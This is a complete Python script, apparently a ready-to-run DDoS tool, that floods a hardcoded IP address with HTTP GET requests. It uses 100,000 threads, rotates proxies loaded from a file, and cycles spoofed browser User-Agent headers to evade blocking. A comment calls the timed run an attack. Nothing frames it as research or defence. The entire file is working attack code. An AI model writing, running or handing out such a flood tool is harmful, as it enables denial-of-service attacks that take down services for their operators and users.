import threading
import requests
import random
import time

class AdvancedHTTPFlood:
      def __init__(self, target, duration, num_threads, proxy_file):
          self.target = target
          self.duration = duration
          self.num_threads = num_threads
          self.proxy_file = proxy_file
          self.headers_list = [
              {
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                  "Accept-Language": "en-US,en;q=0.9",
                  "Connection": "keep-alive",
                  "Accept-Encoding": "gzip, deflate, br"
              },
              {
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                  "Accept-Language": "en-US,en;q=0.9",
                  "Connection": "keep-alive",
                  "Accept-Encoding": "gzip, deflate, br"
              },
              {
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
                  "Accept-Language": "en-US,en;q=0.9",
                  "Connection": "keep-alive",
                  "Accept-Encoding": "gzip, deflate, br"
              }
          ]
          self.start_time = time.time()
          self.proxies = self.load_proxies()

      def load_proxies(self):
          with open(self.proxy_file, 'r') as f:
              proxies = f.read().splitlines()
          return proxies

      def send_request(self):
          while time.time() - self.start_time < self.duration:
              try:
                  headers = random.choice(self.headers_list)
                  proxy = random.choice(self.proxies)
                  proxies = {
                      "http": f"http://{proxy}",
                      "https": f"http://{proxy}"
                  }
                  response = requests.get(self.target, headers=headers, proxies=proxies, timeout=5)
                  print(f"Request sent with status code: {response.status_code}")
              except requests.RequestException:
                  pass

      def run(self):
          threads = []
          for _ in range(self.num_threads):
              t = threading.Thread(target=self.send_request)
              t.start()
              threads.append(t)
          for t in threads:
              t.join()

if __name__ == "__main__":
      target = "http://142.171.195.145/HIT"
      duration = 30  # Duration of attack in seconds
      num_threads = 100000  # Number of threads to create for sending requests
      proxy_file = 'proxys.txt'  # File containing proxy list

      ddos = AdvancedHTTPFlood(target, duration, num_threads, proxy_file)
      ddos.run()
